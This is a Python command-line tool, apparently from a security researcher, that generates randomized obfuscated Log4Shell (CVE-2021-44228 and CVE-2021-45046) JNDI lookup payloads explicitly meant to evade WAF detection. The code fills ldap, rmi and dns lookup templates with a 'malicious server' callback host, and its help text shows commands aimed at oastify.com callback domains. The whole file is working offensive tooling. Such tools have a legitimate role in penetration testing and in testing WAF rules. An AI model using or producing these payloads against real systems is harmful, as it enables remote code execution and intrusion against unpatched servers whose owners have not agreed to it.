#!/usr/bin/env python3
# coding=utf-8
import argparse
import os
import string
import sys
import time
import random

from termcolor import cprint

parser = argparse.ArgumentParser()

parser.add_argument("-hh", "--advanced-help",
                    dest="advanced_help",
                    help="Usage examples.",
                    action="store_true")
parser.add_argument("-s", "--server",
                    dest="server",
                    help="Malicious Server.",
                    action='store')
parser.add_argument("--generate-primary-obfuscated-cve-2021-44228-payload",
                    dest="number_of_generated_primary_obfuscated_cve_2021_44228_payloads",
                    help="Generate primary obfuscated CVE-2021-44228 payloads based on the specified number. Output the "
                         "results to out/CVE-2021-44228/primary/timestamp-cve_2021_44228-primary-obfuscated_payloads.txt.",
                    default=argparse.SUPPRESS,
                    type=int,
                    action='store')
parser.add_argument("--generate-primary-obfuscated-cve-2021-45046-payload",
                    dest="number_of_generated_primary_obfuscated_cve_2021_45046_payloads",
                    help="Generates primary obfuscated CVE-2021-45046 payloads based on the specified number. Output the "
                         "results to out/CVE-2021-45046/primary/timestamp-cve_2021_45046-primary-obfuscated_payloads.txt.",
                    default=argparse.SUPPRESS,
                    type=int,
                    action='store')
parser.add_argument("--generate-secondary-obfuscated-cve-2021-44228-payload",
                    dest="number_of_generated_secondary_obfuscated_cve_2021_44228_payloads",
                    help= "Generate secondary obfuscated CVE-2021-44228 payloads based on the specified number. Output the"
                         " results to out/CVE-2021-44228/secondary/timestamp-cve_2021_44228-secondary-obfuscated-payloads.txt.",
                    default=argparse.SUPPRESS,
                    type=int,
                    action='store')
parser.add_argument("--generate-secondary-obfuscated-cve-2021-45046-payload",
                    dest="number_of_generated_secondary_obfuscated_cve_2021_45046_payloads",
                    help="Generate secondary obfuscated CVE-2021-45046 payloads based on the specified number. Output the"
                         " results to out/CVE-2021-45046/secondary/timestamp-cve_2021_45046-secondary-obfuscated-payloads.txt.",
                    default=argparse.SUPPRESS,
                    type=int,
                    action='store')

args = parser.parse_args()


def print_banner():
    cprint("Log4Shell-obfuscated-payloads-generator: Generate primary obfuscated or secondary obfuscated CVE-2021-44228"
           " or CVE-2021-45046 payloads to evade WAF detection.", "yellow")
    cprint("Author: r3kind1e", "yellow")
    cprint("Blog: https://r3kind1e.github.io/", "yellow")
    cprint("Organization: 0range-Sec-Team", "yellow")
    cprint("Blog: https://0range-sec-team.github.io/", "yellow")
    print()


def print_help_msg():
    if len(sys.argv) <= 1:
        cprint(f"{os.path.basename(__file__)}: error: missing an option, use -h for basic or -hh for advanced help.", "red")
    if args.advanced_help:
        cprint("Usage examples: ", "green")
        cprint("With a single option to generate payloads, the -s option specifies the malicious server:", "green")
        print("--generate-primary-obfuscated-cve-2021-44228-payload 8 -s kbz8tlcz2at7fnbcb9kazo8qwh27qw.oastify.com")
        print("--generate-primary-obfuscated-cve-2021-45046-payload 4 -s y43mmz5dvoml814q4ndos214pvvmjb.oastify.com")
        print("--generate-secondary-obfuscated-cve-2021-44228-payload 5 -s oumccpv3lecbyrugud3eisruflld92.oastify.com")
        print("--generate-secondary-obfuscated-cve-2021-45046-payload 7 -s mwmaenx1nce90pwewb5ckqtshjncb1.oastify.com")
        print()
        cprint("With multiple options to generate payloads, the -s option specifies a malicious server:", "green")
        print("--generate-primary-obfuscated-cve-2021-44228-payload 6 --generate-primary-obfuscated-cve-2021-45046-payload 3 -s 58btq69kzvqsc88x8uhvw95bt2zxnm.oastify.com")
        print("--generate-primary-obfuscated-cve-2021-44228-payload 2 --generate-secondary-obfuscated-cve-2021-44228-payload 1 -s 378rp48iytpqb67v7sgtv749s0ywml.oastify.com")
        print("--generate-primary-obfuscated-cve-2021-44228-payload 5 --generate-secondary-obfuscated-cve-2021-45046-payload 4 -s 9blxtaco2ztwfcb1bykzzd8fw623qs.oastify.com")
        print("--generate-primary-obfuscated-cve-2021-45046-payload 4 --generate-secondary-obfuscated-cve-2021-44228-payload 8 -s kth8bluzkab7xntct92ahoqqehkf84.oastify.com")
        print("--generate-primary-obfuscated-cve-2021-45046-payload 3 --generate-secondary-obfuscated-cve-2021-45046-payload 7 -s 4ins05jj9u0rm7iwitru68fa3190xp.oastify.com")
        print("--generate-secondary-obfuscated-cve-2021-44228-payload 6 --generate-secondary-obfuscated-cve-2021-45046-payload 5 -s k6r8ol7zxao7an6c69fauo3qrhxhl6.oastify.com")
        print()
        cprint("Without specifying a malicious server with the -s option, the {{callback_host}} placeholder will be preserved in the generated payloads:", "green")
        print("--generate-primary-obfuscated-cve-2021-44228-payload 3")
        print("--generate-secondary-obfuscated-cve-2021-44228-payload 6 --generate-secondary-obfuscated-cve-2021-45046-payload 5")
        print()


def load_payloads_template():
    """
Load the payloads template
    """
    read_file_to_list("payloads_template/cve_2021_44228_payloads_template.txt", cve_2021_44228_obfuscated_payloads_template)
    read_file_to_list("payloads_template/cve_2021_45046_payloads_template.txt", cve_2021_45046_obfuscated_payloads_template)


def get_filepath_template_num(option):
    filepath = None
    template = None
    num = None
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    if option == 'number_of_generated_primary_obfuscated_cve_2021_44228_payloads':
        filename = timestamp + "-cve_2021_44228-primary-obfuscated_payloads.txt"
        filepath = "out/CVE-2021-44228/primary/" + filename
        template = cve_2021_44228_obfuscated_payloads_template
        num = args.number_of_generated_primary_obfuscated_cve_2021_44228_payloads

    if option == 'number_of_generated_primary_obfuscated_cve_2021_45046_payloads':
        filename = timestamp + "-cve_2021_45046-primary-obfuscated_payloads.txt"
        filepath = "out/CVE-2021-45046/primary/" + filename
        template = cve_2021_45046_obfuscated_payloads_template
        num = args.number_of_generated_primary_obfuscated_cve_2021_45046_payloads

    if option == 'number_of_generated_secondary_obfuscated_cve_2021_44228_payloads':
        filename = timestamp + "-cve_2021_44228-secondary-obfuscated_payloads.txt"
        filepath = "out/CVE-2021-44228/secondary/" + filename
        template = cve_2021_44228_obfuscated_payloads_template
        num = args.number_of_generated_secondary_obfuscated_cve_2021_44228_payloads

    if option == 'number_of_generated_secondary_obfuscated_cve_2021_45046_payloads':
        filename = timestamp + "-cve_2021_45046-secondary-obfuscated_payloads.txt"
        filepath = "out/CVE-2021-45046/secondary/" + filename
        template = cve_2021_45046_obfuscated_payloads_template
        num = args.number_of_generated_secondary_obfuscated_cve_2021_45046_payloads
    return [filepath, template, num]


def generate_obfuscated_payloads(templates, num, is_secondary_obfuscated):
    """
Generate a specified number of obfuscated payloads.
    :description: According to the specified number, randomly select the payloads template, and replace the placeholder
    in each selected payload template with the obfuscated form of the character. After all the substitutions are done,
    return the specified number of obfuscated payloads as a list.
    :param templates: payloads template(CVE-2021-44228 or CVE-2021-45046)
    :param num: number of payloads
    :param is_secondary_obfuscated: boolean
    :return: list
    """
    selected_template = random.choices(templates, k=num)
    obfuscated_payloads = []

    if is_secondary_obfuscated:
        mapping = mapping_of_placeholders_to_secondary_obfuscated_characters
    else:
        mapping = mapping_of_placeholders_to_primary_obfuscated_characters

    for i in selected_template:
        count = 0
        for key in mapping:
            if count == 0:
                new_payload = i.replace(key, random.choice(mapping[key]))
            else:
                new_payload = new_payload.replace(key, random.choice(mapping[key]))
            count = count + 1
        new_payload = replace_callback_host(new_payload)
        new_payload = replace_random(new_payload)
        obfuscated_payloads.append(new_payload)

    return obfuscated_payloads


def save_payloads(filepath, obfuscated_payloads):
    """
log generated payloads to text files.
    :param filepath: string
    :param obfuscated_payloads: list
    """
    with open(filepath, 'w') as f:
        for payload in obfuscated_payloads:
            f.write("%s\n" % payload)
    cprint(f"[INFO] Generated payloads logged to text files under '{filepath}'", "cyan")


def replace_callback_host(payload):
    """
Replace the {{callback_host}} placeholder in the payload with the malicious server specified by the "-s" option.
    :param payload: payload
    :return: string
    """
    new_payload = payload
    if args.server:
        new_payload = payload.replace("{{callback_host}}", args.server)
    return new_payload


def replace_random(payload):
    """
Replace the {{random}} placeholder in the payload with an 8-digit random string.
    :param payload:
    :return:
    """
    string_val = "".join(random.choice(string.ascii_lowercase) for i in range(8))
    new_payload = payload.replace("{{random}}", string_val)
    return new_payload


if hasattr(args, "number_of_generated_primary_obfuscated_cve_2021_44228_payloads") or\
        hasattr(args, "number_of_generated_primary_obfuscated_cve_2021_45046_payloads") or\
        hasattr(args, "number_of_generated_secondary_obfuscated_cve_2021_44228_payloads") or\
        hasattr(args, "number_of_generated_secondary_obfuscated_cve_2021_45046_payloads"):
    # payloads template
    cve_2021_44228_obfuscated_payloads_template = []
    cve_2021_45046_obfuscated_payloads_template = []

    if hasattr(args, "number_of_generated_primary_obfuscated_cve_2021_44228_payloads") or\
            hasattr(args, "number_of_generated_primary_obfuscated_cve_2021_45046_payloads"):
        # primary obfuscated templates
        lower_case_primary_obfuscated_templates = []
        upper_case_primary_obfuscated_templates = []
        delimiter_primary_obfuscated_templates = []

        lookups_primary_obfuscated = {}
        delimiter_primary_obfuscated = {}
        proto_primary_obfuscated = {}

        j_lookup_primary_obfuscated = []
        n_lookup_primary_obfuscated = []
        d_lookup_primary_obfuscated = []
        i_lookup_primary_obfuscated = []
        jndi_lookup_primary_obfuscated = {
            "j": j_lookup_primary_obfuscated,
            "n": n_lookup_primary_obfuscated,
            "d": d_lookup_primary_obfuscated,
            "i": i_lookup_primary_obfuscated,
        }
        lookups_primary_obfuscated.update({"jndi": jndi_lookup_primary_obfuscated})

        colon_primary_obfuscated = []
        colon_component_primary_obfuscated = {
            ":": colon_primary_obfuscated
        }
        delimiter_primary_obfuscated.update({"colon_component": colon_component_primary_obfuscated})

        r_proto_primary_obfuscated = []
        m_proto_primary_obfuscated = []
        i_proto_primary_obfuscated = []
        rmi_proto_primary_obfuscated = {
            "r": r_proto_primary_obfuscated,
            "m": m_proto_primary_obfuscated,
            "i": i_proto_primary_obfuscated
        }
        proto_primary_obfuscated.update({"rmi": rmi_proto_primary_obfuscated})

        d_proto_primary_obfuscated = []
        n_proto_primary_obfuscated = []
        s_proto_primary_obfuscated = []
        dns_proto_primary_obfuscated = {
            "d": d_proto_primary_obfuscated,
            "n": n_proto_primary_obfuscated,
            "s": s_proto_primary_obfuscated,
        }
        proto_primary_obfuscated.update({"dns": dns_proto_primary_obfuscated})

        l_proto_primary_obfuscated = []
        a_proto_primary_obfuscated = []
        p_proto_primary_obfuscated = []
        ldap_proto_primary_obfuscated = {
            "l": l_proto_primary_obfuscated,
            "a": a_proto_primary_obfuscated,
            "p": p_proto_primary_obfuscated
        }
        proto_primary_obfuscated.update({"ldap": ldap_proto_primary_obfuscated})

        schema_primary = {
            "lookups": lookups_primary_obfuscated,
            "proto": proto_primary_obfuscated,
            "delimiter": delimiter_primary_obfuscated
        }

        mapping_of_placeholders_to_primary_obfuscated_characters = {
            "{{j_lookup}}": j_lookup_primary_obfuscated,
            "{{n_lookup}}": n_lookup_primary_obfuscated,
            "{{d_lookup}}": d_lookup_primary_obfuscated,
            "{{i_lookup}}": i_lookup_primary_obfuscated,
            "{{colon}}": colon_primary_obfuscated,
            "{{r_proto}}": r_proto_primary_obfuscated,
            "{{m_proto}}": m_proto_primary_obfuscated,
            "{{i_proto}}": i_proto_primary_obfuscated,
            "{{d_proto}}": d_proto_primary_obfuscated,
            "{{n_proto}}": n_proto_primary_obfuscated,
            "{{s_proto}}": s_proto_primary_obfuscated,
            "{{l_proto}}": l_proto_primary_obfuscated,
            "{{a_proto}}": a_proto_primary_obfuscated,
            "{{p_proto}}": p_proto_primary_obfuscated
        }

    if hasattr(args, "number_of_generated_secondary_obfuscated_cve_2021_44228_payloads") or\
            hasattr(args, "number_of_generated_secondary_obfuscated_cve_2021_45046_payloads"):
        # secondary obfuscated templates
        lower_case_secondary_obfuscated_templates = []
        upper_case_secondary_obfuscated_templates = []
        delimiter_secondary_obfuscated_templates = []

        lookups_secondary_obfuscated = {}
        delimiter_secondary_obfuscated = {}
        proto_secondary_obfuscated = {}

        j_lookup_secondary_obfuscated = []
        n_lookup_secondary_obfuscated = []
        d_lookup_secondary_obfuscated = []
        i_lookup_secondary_obfuscated = []
        jndi_lookup_secondary_obfuscated = {
            "j": j_lookup_secondary_obfuscated,
            "n": n_lookup_secondary_obfuscated,
            "d": d_lookup_secondary_obfuscated,
            "i": i_lookup_secondary_obfuscated,
        }
        lookups_secondary_obfuscated.update({"jndi": jndi_lookup_secondary_obfuscated})

        colon_secondary_obfuscated = []
        colon_component_secondary_obfuscated = {
            ":": colon_secondary_obfuscated
        }
        delimiter_secondary_obfuscated.update({"colon_component": colon_component_secondary_obfuscated})

        r_proto_secondary_obfuscated = []
        m_proto_secondary_obfuscated = []
        i_proto_secondary_obfuscated = []
        rmi_proto_secondary_obfuscated = {
            "r": r_proto_secondary_obfuscated,
            "m": m_proto_secondary_obfuscated,
            "i": i_proto_secondary_obfuscated
        }
        proto_secondary_obfuscated.update({"rmi": rmi_proto_secondary_obfuscated})

        d_proto_secondary_obfuscated = []
        n_proto_secondary_obfuscated = []
        s_proto_secondary_obfuscated = []
        dns_proto_secondary_obfuscated = {
            "d": d_proto_secondary_obfuscated,
            "n": n_proto_secondary_obfuscated,
            "s": s_proto_secondary_obfuscated,
        }
        proto_secondary_obfuscated.update({"dns": dns_proto_secondary_obfuscated})

        l_proto_secondary_obfuscated = []
        a_proto_secondary_obfuscated = []
        p_proto_secondary_obfuscated = []
        ldap_proto_secondary_obfuscated = {
            "l": l_proto_secondary_obfuscated,
            "a": a_proto_secondary_obfuscated,
            "p": p_proto_secondary_obfuscated
        }
        proto_secondary_obfuscated.update({"ldap": ldap_proto_secondary_obfuscated})

        schema_secondary = {
            "lookups": lookups_secondary_obfuscated,
            "proto": proto_secondary_obfuscated,
            "delimiter": delimiter_secondary_obfuscated
        }

        mapping_of_placeholders_to_secondary_obfuscated_characters = {
            "{{j_lookup}}": j_lookup_secondary_obfuscated,
            "{{n_lookup}}": n_lookup_secondary_obfuscated,
            "{{d_lookup}}": d_lookup_secondary_obfuscated,
            "{{i_lookup}}": i_lookup_secondary_obfuscated,
            "{{colon}}": colon_secondary_obfuscated,
            "{{r_proto}}": r_proto_secondary_obfuscated,
            "{{m_proto}}": m_proto_secondary_obfuscated,
            "{{i_proto}}": i_proto_secondary_obfuscated,
            "{{d_proto}}": d_proto_secondary_obfuscated,
            "{{n_proto}}": n_proto_secondary_obfuscated,
            "{{s_proto}}": s_proto_secondary_obfuscated,
            "{{l_proto}}": l_proto_secondary_obfuscated,
            "{{a_proto}}": a_proto_secondary_obfuscated,
            "{{p_proto}}": p_proto_secondary_obfuscated
        }

        # Placeholder-to-character mapping for the prefix of the secondary obfuscation
        mapping_of_the_secondary_obfuscation_lookup_placeholder_to_character = {
            "{{e_lookup}}": "e",
            "{{r_lookup}}": "r",
            "{{s_lookup}}": "s",
            "{{n_lookup}}": "n",
            "{{p_lookup}}": "p",
            "{{o_lookup}}": "o",
            "{{k_lookup}}": "k",
            "{{m_lookup}}": "m",
            "{{a_lookup}}": "a",
            "{{l_lookup}}": "l",
            "{{w_lookup}}": "w",
            "{{v_lookup}}": "v",
            "{{c_lookup}}": "c",
            "{{t_lookup}}": "t",
            "{{i_lookup}}": "i",
            "{{d_lookup}}": "d",
            "{{g_lookup}}": "g",
            "{{4_lookup}}": "4",
            "{{8_lookup}}": "8",
            "{{x_lookup}}": "x",
            "{{y_lookup}}": "y",
            "{{b_lookup}}": "b",
            "{{j_lookup}}": "j",
            "{{u_lookup}}": "u"
        }


def load_obfuscated_template():
    """
Load primary obfuscated or secondary obfuscated template.
    """
    if hasattr(args, "number_of_generated_primary_obfuscated_cve_2021_44228_payloads") or\
            hasattr(args, "number_of_generated_primary_obfuscated_cve_2021_45046_payloads"):
        read_file_to_list("primary_obfuscated_template/delimiter_obfuscated.txt", delimiter_primary_obfuscated_templates)
        read_file_to_list("primary_obfuscated_template/lower_case_obfuscated.txt", lower_case_primary_obfuscated_templates)
        read_file_to_list("primary_obfuscated_template/upper_case_obfuscated.txt", upper_case_primary_obfuscated_templates)

    if hasattr(args, "number_of_generated_secondary_obfuscated_cve_2021_44228_payloads") or\
            hasattr(args, "number_of_generated_secondary_obfuscated_cve_2021_45046_payloads"):
        read_file_to_list("secondary_obfuscated_template/delimiter_obfuscated.txt", delimiter_secondary_obfuscated_templates)
        read_file_to_list("secondary_obfuscated_template/lower_case_obfuscated.txt", lower_case_secondary_obfuscated_templates)
        read_file_to_list("secondary_obfuscated_template/upper_case_obfuscated.txt", upper_case_secondary_obfuscated_templates)


def replace_templates_placeholders_with_schema_chars(is_secondary_obfuscated):
    """
Obfuscate char in schema. If the parameter is_secondary_obfuscated is True, the chars are obfuscated secondary.
Otherwise, the chars are obfuscated primary.
    :param is_secondary_obfuscated: boolean
    """
    if is_secondary_obfuscated:
        schema = schema_secondary
        lower_case_templates = lower_case_secondary_obfuscated_templates
        upper_case_templates = upper_case_secondary_obfuscated_templates
        delimiter_templates = delimiter_secondary_obfuscated_templates
    else:
        schema = schema_primary
        lower_case_templates = lower_case_primary_obfuscated_templates
        upper_case_templates = upper_case_primary_obfuscated_templates
        delimiter_templates = delimiter_primary_obfuscated_templates

    for part in schema:
            for prefix in schema[part]:
                    for char in schema[part][prefix]:
                            if part == "lookups":
                                replace_placeholders_for_lookups_in_template_with_chars_and_append_replaced_lookups_to_list\
                                    (is_secondary_obfuscated, lower_case_templates, part, prefix, char)
                                replace_placeholders_for_lookups_in_template_with_chars_and_append_replaced_lookups_to_list\
                                    (is_secondary_obfuscated, upper_case_templates, part, prefix, char)
                            if part == "proto":
                                replace_placeholders_for_lookups_in_template_with_chars_and_append_replaced_lookups_to_list\
                                    (is_secondary_obfuscated, lower_case_templates, part, prefix, char)
                            if part == "delimiter":
                                replace_placeholders_for_lookups_in_template_with_chars_and_append_replaced_lookups_to_list\
                                    (is_secondary_obfuscated, delimiter_templates, part, prefix, char)


def replace_placeholders_for_lookups_in_template_with_chars_and_append_replaced_lookups_to_list\
                (is_secondary_obfuscated, templates, part, prefix, char):
    """
writing obfuscated char into the schema.
    :param is_secondary_obfuscated: boolean
    :param templates: lowercase, uppercase or delimiter template.
    :param part: lookups, proto, delimiter
    :param prefix: jndi, rmi/dns/ldap, colon_component
    :param char: j/n/d/i, r/m/i/d/n/s/l/a/p, :
    """
    if is_secondary_obfuscated:
        schema = schema_secondary
    else:
        schema = schema_primary
    for lookup_template in templates:
        lookup = substitute_lowercase_uppercase_lookup_variable_main_argument_key(lookup_template, char)
        if is_secondary_obfuscated:
            for key in mapping_of_the_secondary_obfuscation_lookup_placeholder_to_character:
                lookup = lookup.replace\
                    (key, get_lookup_prefix_char_secondary_obfuscated(mapping_of_the_secondary_obfuscation_lookup_placeholder_to_character[key]))
        schema[part][prefix][char].append(lookup)


def get_lookup_prefix_char_secondary_obfuscated(char):
    """
Replace placeholders for selected unprefixed templates.
    :param char: char
    :return: string
    """
    lookup_prefix_char_secondary_obfuscated_templates = []
    read_file_to_list("secondary_obfuscated_template/lookup_prefix_char_obfuscated.txt",
                      lookup_prefix_char_secondary_obfuscated_templates)
    selected_template = random.choice(lookup_prefix_char_secondary_obfuscated_templates)
    return substitute_lowercase_uppercase_lookup_variable_main_argument_key(selected_template, char)


def substitute_lowercase_uppercase_lookup_variable_main_argument_key(lookup_template, char):
    """
Replace placeholders in obfuscated templates.
    :param lookup_template: lookup in obfuscated templates
    :param char: char
    :return: string
    """
    lookup = lookup_template.replace("{{lowercase}}", char.lower())
    lookup = lookup.replace("{{uppercase}}", char.upper())
    lookup = lookup.replace("{{random_lookup}}", get_random_string(get_string_length()))
    lookup = lookup.replace("{{random_variable}}", get_random_string(get_string_length()))
    lookup = lookup.replace("{{main_argument_key}}", get_main_argument_key())
    return lookup


def get_main_argument_key():
    """
Get Main Arguments Lookup invalid key in index form.
    :description: According to the definition in the Log4j 2 Lookups manual, the key after the "main:" prefix of the
     Main Arguments Lookup can be either a 0-based index in the argument list, or a string. This method will generate
     a key in invalid index form, causing the Main Arguments Lookup to fail and the default value to be used instead.
    :return: string
    """
    return str(random.randint(100, 9999))


def get_string_length():
    """
Get the length of the string at random, in the range 4 to 22, as this is the length of most Lookups and variable names.
    :return: int
    """
    return random.randint(4, 22)


def get_random_string(length):
    """
Generates a random string of specified length, including upper and lowercase letters, numbers, and ".".
This method will be used to generate non-existing lookups and random variable names.
    :param length: length of the string
    :return: string
    """
    letters = string.ascii_letters
    digits = string.digits
    dot = '.'
    char_set = letters+digits+dot
    result_str = ''.join(random.choice(list(char_set)) for i in range(length))
    return result_str


def read_file_to_list(src_file, dst_list):
    """
Read file contents into a list.
    :param src_file: Source File
    :param dst_list: destination list
    """
    with open(src_file, 'r') as f:
        for item in f.readlines():
            item = item.strip()
            if item == "" or item.startswith("#"):
                continue
            dst_list.append(item)


def main():
    print_banner()
    print_help_msg()
    if hasattr(args, "number_of_generated_primary_obfuscated_cve_2021_44228_payloads") or \
            hasattr(args, "number_of_generated_primary_obfuscated_cve_2021_45046_payloads") or \
            hasattr(args, "number_of_generated_secondary_obfuscated_cve_2021_44228_payloads") or \
            hasattr(args, "number_of_generated_secondary_obfuscated_cve_2021_45046_payloads"):
        load_obfuscated_template()
        load_payloads_template()
        if hasattr(args, "number_of_generated_primary_obfuscated_cve_2021_44228_payloads") or\
                hasattr(args, "number_of_generated_primary_obfuscated_cve_2021_45046_payloads"):
            replace_templates_placeholders_with_schema_chars(False)
        if hasattr(args, "number_of_generated_secondary_obfuscated_cve_2021_44228_payloads") or \
                hasattr(args, "number_of_generated_secondary_obfuscated_cve_2021_45046_payloads"):
            replace_templates_placeholders_with_schema_chars(True)
        for option in vars(args).keys():
            is_secondary_obfuscated = False
            if option == "number_of_generated_secondary_obfuscated_cve_2021_44228_payloads" or\
                    option == "number_of_generated_secondary_obfuscated_cve_2021_45046_payloads":
                is_secondary_obfuscated = True
            info = get_filepath_template_num(option)
            if info[0] is not None:
                filepath = info[0]
                templates = info[1]
                num = info[2]
                obfuscated_payloads = generate_obfuscated_payloads(templates, num, is_secondary_obfuscated)
                save_payloads(filepath, obfuscated_payloads)


if __name__ == '__main__':
    main()